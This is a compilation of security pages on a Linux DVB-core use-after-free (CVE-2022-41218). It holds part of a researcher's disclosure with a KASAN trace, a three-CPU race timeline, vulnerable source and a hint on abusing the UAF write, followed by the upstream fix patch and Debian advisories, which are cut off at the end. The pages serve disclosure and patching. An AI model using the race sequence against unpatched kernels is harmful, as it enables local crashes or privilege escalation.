[  708.983181]  do_filp_open+0x1b1/0x3e0
[  708.983184]  do_sys_openat2+0x132/0x450
[  708.983187]  __x64_sys_openat+0x128/0x210
[  708.983191]  do_syscall_64+0x59/0x90
[  708.983194]  entry_SYSCALL_64_after_hwframe+0x63/0xcd

[  708.983201] Freed by task 159:
[  708.983204]  kasan_save_stack+0x26/0x50
[  708.983207]  kasan_set_track+0x25/0x40
[  708.983211]  kasan_set_free_info+0x24/0x40
[  708.983215]  ____kasan_slab_free+0x176/0x1e0
[  708.983218]  __kasan_slab_free+0x12/0x20
[  708.983221]  slab_free_freelist_hook+0xd0/0x1a0
[  708.983224]  kfree+0x1ae/0x3e0
[  708.983227]  dvb_free_device.part.0+0x33/0x70 [dvb_core]
[  708.983241]  dvb_unregister_device+0x20/0x30 [dvb_core]
[  708.983248]  dvb_dmxdev_release+0x3ba/0x4e3 [dvb_core]
[  708.983255]  ttusb_dec_disconnect+0x3d8/0x499 [ttusb_dec]
[  708.983258]  usb_unbind_interface+0x187/0x7c0
[  708.983261]  device_remove+0x117/0x170
[  708.983264]  device_release_driver_internal+0x418/0x660
[  708.983266]  device_release_driver+0x12/0x20
[  708.983268]  bus_remove_device+0x28f/0x540
[  708.983270]  device_del+0x501/0xc30
[  708.983273]  usb_disable_device+0x2a5/0x660
[  708.983274]  usb_disconnect.cold+0x1f9/0x620
[  708.983277]  hub_event+0x16d3/0x3d20
[  708.983280]  process_one_work+0x778/0x11c0
[  708.983283]  worker_thread+0x544/0x1180
[  708.983285]  kthread+0x280/0x320
[  708.983286]  ret_from_fork+0x1f/0x30

[  708.983291] The buggy address belongs to the object at ffff888114bd4000
                which belongs to the cache kmalloc-512 of size 512
[  708.983293] The buggy address is located 120 bytes inside of
                512-byte region [ffff888114bd4000, ffff888114bd4200)

[  708.983297] The buggy address belongs to the physical page:
[  708.983298] page:000000009b45bbf6 refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x114bd0
[  708.983301] head:000000009b45bbf6 order:3 compound_mapcount:0 compound_pincount:0
[  708.983303] flags: 0x17ffffc0010200(slab|head|node=0|zone=2|lastcpupid=0x1fffff)
[  708.983307] raw: 0017ffffc0010200 dead000000000100 dead000000000122 ffff888100042c80
[  708.983309] raw: 0000000000000000 0000000080200020 00000001ffffffff 0000000000000000
[  708.983311] page dumped because: kasan: bad access detected

[  708.983313] Memory state around the buggy address:
[  708.983314]  ffff888114bd3f00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[  708.983316]  ffff888114bd3f80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[  708.983318] >ffff888114bd4000: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[  708.983320]                                                                 ^
[  708.983321]  ffff888114bd4080: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[  708.983323]  ffff888114bd4100: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[  708.983325] ==================================================================
[  708.983336] Disabling lock debugging due to kernel taint
```

## 3. slab UAF write
The third slab UAF vulnerability is almost identical to the second one.
It only occurs in minute race condition time differences.

the order of the exploit is as follows:
```
                cpu0                                            cpu1                                    cpu 2
                                                        1. dvb_dvr_open()
2. ttusb_dec_disconnect()
   ttusb_dec_exit_dvb()
   dvb_dmxdev_release()
   wait_event(dmxdev->dvr_dvbdev->wait_queue, ...)
                                                                                                3. dvb_demux_open()
                                                        4. dvb_dvr_release()
5. dvb_unregister_device(dmxdev->dvbdev)
   dvb_free_device()
   kfree (dvbdev)
                                                                                                6. dvb_demux_release()
                                                                                                   dmxdev->dvbdev->users--;  <- UAF!!
```

The detailed exploit flow is as follows:

1 ~ 4. The order of 1-4 is the same as the first vulnerability.

5. This time, "dvbdev", not "dvbdev->fops", is the target of the UAF vulnerability:
```
void dvb_free_device(struct dvb_device *dvbdev)
{
        if (!dvbdev)
                return;

        kfree (dvbdev->fops);
        kfree (dvbdev);    // target
}
EXPORT_SYMBOL(dvb_free_device);
```

6. When close(demux0) is executed, the dvb_demux_release() function is called and a UAF write vulnerability occurs in "dmxdev->dvbdev->users--;".
```
static int dvb_demux_release(struct inode *inode, struct file *file)
{
        struct dmxdev_filter *dmxdevfilter = file->private_data;
        struct dmxdev *dmxdev = dmxdevfilter->dev;
        int ret;

        ret = dvb_dmxdev_filter_free(dmxdev, dmxdevfilter);

        mutex_lock(&dmxdev->mutex);
        dmxdev->dvbdev->users--;    // here
        if (dmxdev->dvbdev->users == 1 && dmxdev->exit == 1) {
                mutex_unlock(&dmxdev->mutex);
                wake_up(&dmxdev->dvbdev->wait_queue);
        } else
                mutex_unlock(&dmxdev->mutex);

        return ret;
}
```
This UAF write vulnerability can be used, for example, to decrement the refcount of another structure.

The poc code is the same as the above vulnerability.

# vulnerability scope
The scope of this vulnerability is:

- drivers/media/usb/as102/as102_usb_drv.c
- drivers/media/usb/tm6000/tm6000-cards.c
- drivers/media/usb/pvrusb2/pvrusb2-dvb.c
- drivers/media/usb/au0828/au0828-core.c
- drivers/media/usb/cx231xx/cx231xx-cards.c
- drivers/media/usb/ttusb-dec/ttusb_dec.c
- drivers/media/usb/ttusb-budget/dvb-ttusb-budget.c
- drivers/media/usb/em28xx/em28xx-dvb.c
- drivers/media/usb/dvb-usb/cxusb.c
- drivers/media/usb/dvb-usb/dw2102.c
- drivers/media/usb/dvb-usb/dtt200u.c
- drivers/media/usb/dvb-usb/m920x.c
- drivers/media/usb/dvb-usb/dibusb-mb.c
- drivers/media/usb/dvb-usb/ttusb2.c
- drivers/media/usb/dvb-usb/pctv452e.c
- drivers/media/usb/dvb-usb/a800.c
- drivers/media/usb/dvb-usb/umt-010.c
- drivers/media/usb/dvb-usb/dtv5100.c
- drivers/media/usb/dvb-usb/dibusb-mc.c
- drivers/media/usb/dvb-usb/cinergyT2-core.c
- drivers/media/usb/dvb-usb/nova-t-usb2.c
- drivers/media/usb/dvb-usb/vp7045.c
- drivers/media/usb/dvb-usb/digitv.c
- drivers/media/usb/dvb-usb/gp8psk.c
- drivers/media/usb/dvb-usb/vp702x.c
- drivers/media/usb/dvb-usb/opera1.c
- drivers/media/usb/dvb-usb/technisat-usb2.c
- drivers/media/usb/dvb-usb/dib0700_core.c
- drivers/media/usb/dvb-usb/az6027.c
- drivers/media/usb/dvb-usb/af9005.c
- drivers/media/usb/dvb-usb-v2/au6610.c
- drivers/media/usb/dvb-usb-v2/zd1301.c
- drivers/media/usb/dvb-usb-v2/ce6230.c
- drivers/media/usb/dvb-usb-v2/ec168.c
- drivers/media/usb/dvb-usb-v2/gl861.c
- drivers/media/usb/dvb-usb-v2/dvbsky.c
- drivers/media/usb/dvb-usb-v2/az6007.c
- drivers/media/usb/dvb-usb-v2/lmedm04.c
- drivers/media/usb/dvb-usb-v2/anysee.c
- drivers/media/usb/dvb-usb-v2/mxl111sf.c
- drivers/media/usb/dvb-usb-v2/af9015.c
- drivers/media/usb/dvb-usb-v2/rtl28xxu.c
- drivers/media/usb/dvb-usb-v2/af9035.c

Best Regards,
Hyunwoo Kim.

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from lore.kernel.org_eaa9f10f_20250114_211832.html ===

```
[All of lore.kernel.org](../?t=20220908132844)
 [help](../_/text/help/) / [color](../_/text/color/) / [mirror](../_/text/mirror/) / [Atom feed](../new.atom)
```
```
From: Takashi Iwai <tiwai@suse.de>
To: Mauro Carvalho Chehab <mchehab@kernel.org>
Cc: Hyunwoo Kim <imv4bel@gmail.com>,
	[linux-media@vger.kernel.org](../../linux-media/?t=20220908132844), [linux-kernel@vger.kernel.org](../../lkml/?t=20220908132844)
Subject: [[PATCH] media: dvb-core: Fix UAF due to refcount races at releasing](#r)
Date: Thu,  8 Sep 2022 15:27:54 +0200	[[thread overview]](#r)
Message-ID: <20220908132754.30532-1-tiwai@suse.de> (<raw>)

The dvb-core tries to sync the releases of opened files at
dvb_dmxdev_release() with two refcounts: dvbdev->users and
dvr_dvbdev->users.  A problem is present in those two syncs: when yet
another dvb_demux_open() is called during those sync waits,
dvb_demux_open() continues to process even if the device is being
closed.  This includes the increment of the former refcount, resulting
in the leftover refcount after the sync of the latter refcount at
dvb_dmxdev_release().  It ends up with use-after-free, since the
function believes that all usages were gone and releases the
resources.

This patch addresses the problem by adding the check of dmxdev->exit
flag at dvb_demux_open(), just like dvb_dvr_open() already does.  With
the exit flag check, the second call of dvb_demux_open() fails, hence
the further corruption can be avoided.

Also for avoiding the races of the dmxdev->exit flag reference, this
patch serializes the dmxdev->exit set up and the sync waits with the
dmxdev->mutex lock at dvb_dmxdev_release().  Without the mutex lock,
dvb_demux_open() (or dvb_dvr_open()) may run concurrently with
dvb_dmxdev_release(), which allows to skip the exit flag check and
continue the open process that is being closed.

Reported-by: Hyunwoo Kim <imv4bel@gmail.com>
Cc: <stable@vger.kernel.org>
Signed-off-by: Takashi Iwai <tiwai@suse.de>
---
 [drivers/media/dvb-core/dmxdev.c](#Z31drivers:media:dvb-core:dmxdev.c) | 8 ++++++++
 1 file [changed](#related), 8 insertions(+)

[diff](#iZ31drivers:media:dvb-core:dmxdev.c) --git a/drivers/media/dvb-core/dmxdev.c b/drivers/media/dvb-core/dmxdev.c
index f6ee678107d3..9ce5f010de3f 100644
--- a/drivers/media/dvb-core/dmxdev.c
+++ b/drivers/media/dvb-core/dmxdev.c
@@ -790,6 +790,11 @@ static int dvb_demux_open(struct inode *inode, struct file *file)
 	if (mutex_lock_interruptible(&dmxdev->mutex))
 		return -ERESTARTSYS;

+	if (dmxdev->exit) {
+		mutex_unlock(&dmxdev->mutex);
+		return -ENODEV;
+	}
+
 	for (i = 0; i < dmxdev->filternum; i++)
 		if (dmxdev->filter[i].state == DMXDEV_STATE_FREE)
 			break;
@@ -1448,7 +1453,10 @@ EXPORT_SYMBOL(dvb_dmxdev_init);

 void dvb_dmxdev_release(struct dmxdev *dmxdev)
 {
+	mutex_lock(&dmxdev->mutex);
 	dmxdev->exit = 1;
+	mutex_unlock(&dmxdev->mutex);
+
 	if (dmxdev->dvbdev->users > 1) {
 		wait_event(dmxdev->dvbdev->wait_queue,
 				dmxdev->dvbdev->users == 1);
--
2.35.3

```

---

```
[next](../87sfklgozd.wl-tiwai%40suse.de/)             [reply](#R)	other threads:[[~2022-09-08 13:28 UTC](../?t=20220908132844)|[newest](../)]

Thread overview: 5+ messages / expand[[flat](T/#u)|[nested](t/#u)]  [mbox.gz](t.mbox.gz)  [Atom feed](t.atom)  [top](#b)
2022-09-08 13:27 [Takashi Iwai [this message]](#t)
2022-09-21  7:34 ` [[PATCH] media: dvb-core: Fix UAF due to refcount races at releasing](../87sfklgozd.wl-tiwai%40suse.de/) Takashi Iwai
2022-10-11  7:06   ` [Takashi Iwai](../87k056dekm.wl-tiwai%40suse.de/)
2022-11-16 11:08     ` [Salvatore Bonaccorso](../Y3TEk7Nr3yAQIozQ%40eldamar.lan/)
2022-11-16 13:19       ` [Hyunwoo Kim](../20221116131928.GA7144%40ubuntu/)

```
```
find likely ancestor, descendant, or conflicting patches for [this message](#t):
( dfblob:f6ee678107d dfblob:9ce5f010de3 )
 OR (
bs:"[PATCH] media: dvb-core: Fix UAF due to refcount races at releasing" )
	([help](../_/text/help/#search))
```

---

```
Reply instructions:

You may reply publicly to [this message](#t) via plain-text email
using any one of the following methods:

* Save the following mbox file, import it into your mail client,
  and reply-to-all from there: [mbox](raw)

  Avoid top-posting and favor interleaved quoting:
  <https://en.wikipedia.org/wiki/Posting_style#Interleaved_style>

* Reply using the --to, --cc, and --in-reply-to
  switches of git-send-email(1):

  git send-email \
    --in-reply-to=20220908132754.30532-1-tiwai@suse.de \
    --to=tiwai@suse.de \
    --cc=imv4bel@gmail.com \
    --cc=linux-kernel@vger.kernel.org \
    --cc=linux-media@vger.kernel.org \
    --cc=mchehab@kernel.org \
    /path/to/YOUR_REPLY

  <https://kernel.org/pub/software/scm/git/docs/git-send-email.html>

* If your mail client supports setting the In-Reply-To header
  via mailto: links, try the mailto: link

```
Be sure your reply has a **Subject:** header at the top and a blank line
before the message body.

---

```
This is an external index of several public inboxes,
see [mirroring instructions](../_/text/mirror/) on how to clone and mirror
all data and code used by this external index.
```


=== Content from lists.debian.org_2bafc90c_20250114_211831.html ===


---

[Date Prev][[Date Next](msg00001.html)]
[Thread Prev][[Thread Next](msg00001.html)]
[[Date Index](maillist.html#00000)]
[[Thread Index](threads.html#00000)]

# [SECURITY] [DLA 3349-1] linux-5.10 security update

---

* *To*: debian-lts-announce@lists.debian.org
* *Subject*: [SECURITY] [DLA 3349-1] linux-5.10 security update
* *From*: Ben Hutchings <benh@debian.org>
* *Date*: Thu, 2 Mar 2023 23:05:14 +0100
* *Message-id*: <[[🔎]](/msgid-search/ZAEdmsNQXriVISie%40decadent.org.uk) [ZAEdmsNQXriVISie@decadent.org.uk](msg00000.html)>
* *Mail-followup-to*: debian-lts@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```
-------------------------------------------------------------------------
Debian LTS Advisory DLA-3349-1                debian-lts@lists.debian.org
<https://www.debian.org/lts/security/>                        Ben Hutchings
March 02, 2023                                <https://wiki.debian.org/LTS>
-------------------------------------------------------------------------

Package        : linux-5.10
Version        : 5.10.162-1~deb10u1
CVE ID         : CVE-2022-2873 CVE-2022-3545 CVE-2022-3623 CVE-2022-4696
                 CVE-2022-36280 CVE-2022-41218 CVE-2022-45934 CVE-2022-47929
                 CVE-2023-0179 CVE-2023-0240 CVE-2023-0266 CVE-2023-0394
                 CVE-2023-23454  CVE-2023-23455 CVE-2023-23586
Debian Bug     : 825141 1008501 1027430 1027483

Several vulnerabilities have been discovered in the Linux kernel that
may lead to a privilege escalation, denial of service or information
leaks.

CVE-2022-2873

    Zheyu Ma discovered that an out-of-bounds memory access flaw in
    the Intel iSMT SMBus 2.0 host controller driver may result in
    denial of service (system crash).

CVE-2022-3545

    It was discovered that the Netronome Flow Processor (NFP) driver
    contained a use-after-free flaw in area_cache_get(), which may
    result in denial of service or the execution of arbitrary code.

CVE-2022-3623

    A race condition when looking up a CONT-PTE/PMD size hugetlb page
    may result in denial of service or an information leak.

CVE-2022-4696

    A use-after-free vulnerability was discovered in the io_uring
    subsystem.

CVE-2022-36280

    An out-of-bounds memory write vulnerability was discovered in the
    vmwgfx driver, which may allow a local unprivileged user to cause
    a denial of service (system crash).

CVE-2022-41218

    Hyunwoo Kim reported a use-after-free flaw in the Media DVB core
    subsystem caused by refcount races, which may allow a local user
    to cause a denial of service or escalate privileges.

CVE-2022-45934

    An integer overflow in l2cap_config_req() in the Bluetooth
    subsystem was discovered, which may allow a physically proximate
    attacker to cause a denial of service (system crash).

CVE-2022-47929

    Frederick Lawler reported a NULL pointer dereference in the
    traffic control subsystem allowing an unprivileged user to cause a
    denial of service by setting up a specially crafted traffic
    control configuration.

CVE-2023-0179

    Davide Ornaghi discovered incorrect arithmetics when fetching VLAN
    header bits in the netfilter subsystem, allowing a local user to
    leak stack and heap addresses or potentially local privilege
    escalation to root.

CVE-2023-0240

    A flaw was discovered in the io_uring subsystem that could lead
    to a use-after-free.  A local user could exploit this to cause
    a denial of service (crash or memory corruption) or possibly for
    privilege escalation.

CVE-2023-0266

    A use-after-free flaw in the sound subsystem due to missing
    locking may result in denial of service or privilege escalation.

CVE-2023-0394

    Kyle Zeng discovered a NULL pointer dereference flaw in
    rawv6_push_pending_frames() in the network subsystem allowing a
    local user to cause a denial of service (system crash).

CVE-2023-23454

    Kyle Zeng reported that the Class Based Queueing (CBQ) network
    scheduler was prone to denial of service due to interpreting
    classification results before checking the classification return
    code.

CVE-2023-23455

    Kyle Zeng reported that the ATM Virtual Circuits (ATM) network
    scheduler was prone to a denial of service due to interpreting
    classification results before checking the classification return
    code.

CVE-2023-23586

    A flaw was discovered in the io_uring subsystem that could lead to
    an information leak.  A local user could exploit this to obtain
    sensitive information from the kernel or other users.

For Debian 10 buster, these problems have been fixed in version
5.10.162-1~deb10u1.

This update also fixes Debian bugs #825141, #1008501, #1027430, and
#1027483, and includes many more bug fixes from stable updates
5.10.159-5.10.162 inclusive.

We recommend that you upgrade your linux-5.10 packages.

For the detailed security status of linux-5.10 please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/linux-5.10>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>

```

**Attachment:
[signature.asc](pgpaqzwJDO6b5.pgp)**

*Description:* PGP signature

---



=== Content from lists.debian.org_cf152cef_20250114_211831.html ===


---

[[Date Prev](msg00005.html)][[Date Next](msg00007.html)]
[[Thread Prev](msg00005.html)][[Thread Next](msg00007.html)]
[[Date Index](maillist.html#00006)]
[[Thread Index](threads.html#00006)]

# [SECURITY] [DLA 3403-1] linux security update

---

* *To*: debian-lts-announce@lists.debian.org
* *Subject*: [SECURITY] [DLA 3403-1] linux security update
* *From*: Ben Hutchings <benh@debian.org>
* *Date*: Wed, 3 May 2023 14:01:28 +0200
* *Message-id*: <[[🔎]](/msgid-search/ZFJNGHuB08t0uKuB%40decadent.org.uk) [ZFJNGHuB08t0uKuB@decadent.org.uk](msg00006.html)>
* *Mail-followup-to*: debian-lts@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```
-------------------------------------------------------------------------
Debian LTS Advisory DLA-3403-1                debian-lts@lists.debian.org
<https://www.debian.org/lts/security/>                        Ben Hutchings
May 3, 2023                                   <https://wiki.debian.org/LTS>
-------------------------------------------------------------------------

Package        : linux
Version        : 4.19.282-1
CVE ID         : CVE-2022-2873 CVE-2022-3424 CVE-2022-3545 CVE-2022-3707
                 CVE-2022-4744 CVE-2022-36280 CVE-2022-41218 CVE-2022-45934
                 CVE-2022-47929 CVE-2023-0045 CVE-2023-0266 CVE-2023-0394
                 CVE-2023-0458 CVE-2023-0459 CVE-2023-0461 CVE-2023-1073
                 CVE-2023-1074 CVE-2023-1078 CVE-2023-1079 CVE-2023-1118
                 CVE-2023-1281 CVE-2023-1513 CVE-2023-1670 CVE-2023-1829
                 CVE-2023-1855 CVE-2023-1859 CVE-2023-1989 CVE-2023-1990
                 CVE-2023-1998 CVE-2023-2162 CVE-2023-2194 CVE-2023-23454
                 CVE-2023-23455 CVE-2023-23559 CVE-2023-26545 CVE-2023-28328
                 CVE-2023-30456 CVE-2023-30772
Debian Bug     : 825141

Several vulnerabilities have been discovered in the Linux kernel that
may lead to a privilege escalation, denial of service, or information
leak.

CVE-2022-2873

    Zheyu Ma discovered that an out-of-bounds memory access flaw in
    the Intel iSMT SMBus 2.0 host controller driver may result in
    denial of service (system crash).

CVE-2022-3424

    Zheng Wang and Zhuorao Yang reported a flaw in the SGI GRU driver
    which could lead to a use-after-free.  On systems where this driver
    is used, a local user can explit this for denial of service (crash
    or memory corruption) or possibly for privilege escalation.

    This driver is not enabled in Debian's official kernel
    configurations.

CVE-2022-3545

    It was discovered that the Netronome Flow Processor (NFP) driver
    contained a use-after-free flaw in area_cache_get(), which may
    result in denial of service or the execution of arbitrary code.

CVE-2022-3707

    Zheng Wang reported a flaw in the i915 graphics driver's
    virtualisation (GVT-g) support that could lead to a double-free.
    On systems where this feature is used, a guest can exploit this
    for denial of service (crash or memory corruption) or possibly for
    privilege escalation.

CVE-2022-4744

    The syzkaller tool found a flaw in the TUN/TAP network driver,
    which can lead to a double-free.  A local user can exploit this
    for denial of service (crash or memory corruption) or possibly for
    privilege escalation.

CVE-2022-36280

    An out-of-bounds memory write vulnerability was discovered in the
    vmwgfx driver, which may allow a local unprivileged user to cause
    a denial of service (system crash).

CVE-2022-41218

    Hyunwoo Kim reported a use-after-free flaw in the Media DVB core
    subsystem caused by refcount races, which may allow a local user
    to cause a denial of service or escalate privileges.

CVE-2022-45934

    An integer overflow in l2cap_config_req() in the Bluetooth
    subsystem was discovered, which may allow a physically proximate
    attacker to cause a denial of service (system crash).

CVE-2022-47929

    Frederick Lawler reported a NULL pointer dereference in the
    traffic control subsystem allowing an unprivileged user to cause a
    denial of service by setting up a specially crafted traffic
    control configuration.

CVE-2023-0045

    Rodrigo Branco and Rafael Correa De Ysasi reported that when a
    user-space task told the kernel to enable Spectre v2 mitigation
    for it, the mitigation was not enabled until the task was next
    rescheduled.  This might be exploitable by a local or remote
    attacker to leak sensitive information from such an application.

CVE-2023-0266

    A use-after-free flaw in the sound subsystem due to missing
    locking may result in denial of service or privilege escalation.

CVE-2023-0394

    Kyle Zeng discovered a NULL pointer dereference flaw in
    rawv6_push_pending_frames() in the network subsystem allowing a
    local user to cause a denial of service (system crash).

CVE-2023-0458

    Jordy Zimmer and Alexandra Sandulescu found that getrlimit() and
    related system calls were vulnerable to speculative execution
    attacks such as Spectre v1.  A local user could explot this to
    leak sensitive information from the kernel.

CVE-2023-0459

    Jordy Zimmer and Alexandra Sandulescu found a regression in
    Spectre v1 mitigation in the user-copy functions for the amd64
    (64-bit PC) architecture.  Where the CPUs do not implement SMAP or
    it is disabled, a local user could exploit this to leak sensitive
    information from the kernel.  Other architectures may also be
    affected.

CVE-2023-0461

    "slipper" reported a flaw in the kernel's support for ULPs (Upper
    Layer Protocols) on top of TCP that can lead to a double-free when
    using kernel TLS sockets.  A local user can exploit this for
    denial of service (crash or memory corruption) or possibly for
    privilege escalation.

    Kernel TLS is not enabled in Debian's official kernel
    configurations.

CVE-2023-1073

    Pietro Borrello reported a type confusion flaw in the HID (Human
    Interface Device) subsystem.  An attacker able to insert and
    remove USB devices might be able to use this to cause a denial of
    service (crash or memory corruption) or possibly to run arbitrary
    code in the kernel.

CVE-2023-1074

    Pietro Borrello reported a type confusion flaw in the SCTP
    protocol implementation which can lead to a memory leak.  A local
    user could exploit this to cause a denial of service (resource
    exhaustion).

CVE-2023-1078

    Pietro Borrello reported a type confusion flaw in the RDS protocol
    implementation.  A local user could exploit this to cause a denial
    of service (crash or memory corruption) or possibly for privilege
    escalation.

CVE-2023-1079

    Pietro Borrello reported a race condition in the hid-asus HID
    driver which could lead to a use-after-free.  An attacker able to
    insert and remove USB devices can use this to cause a denial of
    service (crash or memory corruption) or possibly to run arbitrary
    code in the kernel.

CVE-2023-1118

    Duoming Zhou reported a race condition in the ene_ir remote
    control driver that can lead to a use-after-free if the driver
    is unbound.  It is not clear what the security impact of this is.

CVE-2023-1281, CVE-2023-1829

    "valis" reported two flaws in the cls_tcindex network traffic
    classifier which could lead to a use-after-free.  A local user can
    exploit these for privilege escalation.  This update removes
    cls_tcindex entirely.

CVE-2023-1513

    Xingyuan Mo reported an information leak in the KVM implementation
    for the i386 (32-bit PC) architecture.  A local user could exploit
    this to leak sensitive information from the kernel.

CVE-2023-1670

    Zheng Wang reported a race condition in the xirc2ps_cs network
    driver which can lead to a use-after-free.  An attacker able to
    insert and remove PCMCIA devices can use this to cause a denial of
    service (crash or memory corruption) or possibly to run arbitrary
    code in the kernel.

CVE-2023-1855

    Zheng Wang reported a race condition in the xgene-hwmon hardware
    monitoring driver that may lead to a use-after-free.  It is not
    clear what the security impact of this is.

CVE-2023-1859

    Zheng Wang reported a race condition in the 9pnet_xen transport
    for the 9P filesystem on Xen, which can lead to a use-after-free.
    On systems where this feature is used, a backend driver in another
    domain can use this to cause a denial of service (crash or memory
    corruption) or possibly to run arbitrary code in the vulnerable
    domain.

CVE-2023-1989

    Zheng Wang reported a race condition in the btsdio Bluetooth
    adapter driver that can lead to a use-after-free.  An attacker
    able to insert and remove SDIO devices can use this to cause a
    denial of service (crash or memory corruption) or possibly to run
    arbitrary code in the kernel.

CVE-2023-1990

    Zheng Wang reported a race condition in the st-nci NFC adapter
    driver that can lead to a use-after-free.  It is not clear what
    the security impact of this is.

    This driver is not enabled in Debian's official kernel
    configurations.

CVE-2023-1998

    José Oliveira and Rodrigo Branco reported a regression in Spectre
    v2 mitigation for user-space on x86 CPUs supporting IBRS but not
    eIBRS.  This might be exploitable by a local or remote attacker to
    leak sensitive information from a user-space application.

CVE-2023-2162

    Mike Christie reported a race condition in the iSCSI TCP transport
    that can lead to a use-after-free.  On systems where this feature
    is used, a local user might be able to use this to cause a denial
    of service (crash or memory corruption) or possibly for privilege
    escalation.

CVE-2023-2194

    Wei Chen reported a potential heap buffer overflow in the
    i2c-xgene-slimpro I²C adapter driver.  A local user with
    permission to access such a device can use this to cause a denial
    of service (crash or memory corruption) and probably for privilege
    escalation.

CVE-2023-23454

    Kyle Zeng reported that the Class Based Queueing (CBQ) network
    scheduler was prone to denial of service due to interpreting
    classification results before checking the classification return
    code.

CVE-2023-23455

    Kyle Zeng reported that the ATM Virtual Circuits (ATM) network
    scheduler was prone to a denial of service due to interpreting
    classification results before checking the classification return
    code.

CVE-2023-23559

    Szymon Heidrich reported incorrect bounds checks in the rndis_wlan
    Wi-Fi driver which may lead to a heap buffer overflow or overread.
    An attacker able to insert and remove USB devices can use this to
    cause a denial of service (crash or memory corruption) or
    information leak, or possibly to run arbitrary code in the kernel.

CVE-2023-26545

    Lianhui Tang reported a flaw in the MPLS protocol implementation
    that could lead to a double-free.  A local user might be able to
    exploit this to cause a denial of service (crash or memory
    corruption) or possibl for privilege escalation.

CVE-2023-28328

    Wei Chen reported a flaw in the az6927 DVB driver that can lead to
    a null pointer dereference.  A local user permitted to access an
    I²C adapter device that this driver creates can use this to cause
    a denial of service (crash).

CVE-2023-30456

    Reima ISHII reported a flaw in the KVM implementation for Intel
    CPUs affecting nested virtualisation.  When KVM was used as the L0
    hypervisor, and EPT and/or unrestricted guest mode was disabled,
    it did not prevent an L2 guest from being configured with an
    architecturally invalid protection/paging mode.  A malicious guest
    could exploit this to cause a denial of service (crash).

CVE-2023-30772

    Zheng Wang reported a race condition in the da9150 charger driver
    which could lead to a use-after-free.  It is not clear what the
    security impact of this is.

    This driver is not enabled in Debian's official kernel
    configurations.

For Debian 10 buster, these problems have been fixed in version
4.19.282-1.  This update additionally fixes Debian bug #825141, and
includes many more bug fixes from stable updates 4.19.270-4.19.282
inclusive.

We recommend that you upgrade your linux packages.

For the detailed security status of linux please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/linux>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>

```

**Attachment:
[signature.asc](pgpM9k3CPindH.pgp)**

*Description:* PGP signature

---



=== Content from www.debian.org_92bfbf63_20250114_211833.html ===


---

[[Date Prev](msg00012.html)][[Date Next](msg00014.html)]
[[Thread Prev](msg00012.html)][[Thread Next](msg00014.html)]
[[Date Index](maillist.html#00013)]
[[Thread Index](threads.html#00013)]

# [SECURITY] [DSA 5324-1] linux security update

---

* *To*: debian-security-announce@lists.debian.org
* *Subject*: [SECURITY] [DSA 5324-1] linux security update
* *From*: Salvatore Bonaccorso <carnil@debian.org>
* *Date*: Mon, 23 Jan 2023 20:11:44 +0000
* *Message-id*: <[[🔎]](/msgid-search/E1pK3AO-006ihI-7r%40seger.debian.org) [E1pK3AO-006ihI-7r@seger.debian.org](msg00013.html)>
* *Reply-to*: debian-security-announce-request@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

- -------------------------------------------------------------------------
Debian Security Advisory DSA-5324-1                   security@debian.org
<https://www.debian.org/security/>                     Salvatore Bonaccorso
January 23, 2023                      <https://www.debian.org/security/faq>
- -------------------------------------------------------------------------

Package        : linux
CVE ID         : CVE-2022-2873 CVE-2022-3545 CVE-2022-3623 CVE-2022-4696
                 CVE-2022-36280 CVE-2022-41218 CVE-2022-45934 CVE-2022-47929
                 CVE-2023-0179 CVE-2023-0266 CVE-2023-0394 CVE-2023-23454
                 CVE-2023-23455

Several vulnerabilities have been discovered in the Linux kernel that
may lead to a privilege escalation, denial of service or information
leaks.

CVE-2022-2873

    Zheyu Ma discovered that an out-of-bounds memory access flaw in the
    Intel iSMT SMBus 2.0 host controller driver may result in denial of
    service (system crash).

CVE-2022-3545

    It was discovered that the Netronome Flow Processor (NFP) driver
    contained a use-after-free flaw in area_cache_get(), which may
    result in denial of service or the execution of arbitrary code.

CVE-2022-3623

    A race condition when looking up a CONT-PTE/PMD size hugetlb page
    may result in denial of service or an information leak.

CVE-2022-4696

    A use-after-free vulnerability was discovered in the io_uring
    subsystem.

CVE-2022-36280

    An out-of-bounds memory write vulnerability was discovered in the
    vmwgfx driver, which may allow a local unprivileged user to cause a
    denial of service (system crash).

CVE-2022-41218

    Hyunwoo Kim reported a use-after-free flaw in the Media DVB core
    subsystem caused by refcount races, which may allow a local user to
    cause a denial of service or escalate privileges.

CVE-2022-45934

    An integer overflow in l2cap_config_req() in the Bluetooth subsystem
    was discovered, which may allow a physically proximate attacker to
    cause a denial of service (system crash).

CVE-2022-47929

    Frederick Lawler reported a NULL pointer dereference in the traffic
    control subsystem allowing an unprivileged user to cause a denial of
    service by setting up a specially crafted traffic control
    configuration.

CVE-2023-0179

    Davide Ornaghi discovered incorrect arithmetics when fetching VLAN
    header bits in the netfilter subsystem, allowing a local user to
    leak stack and heap addresses or potentially local privilege
    escalation to root.

CVE-2023-0266

    A use-after-free flaw in the sound subsystem due to missing locking
    may result in denial of service or privilege escalation.

CVE-2023-0394

    Kyle Zeng discovered a NULL pointer dereference flaw in
    rawv6_push_pending_frames() in the network subsystem allowing a
    local user to cause a denial of service (system crash).

CVE-2023-23454

    Kyle Zeng reported that the Class Based Queueing (CBQ) network
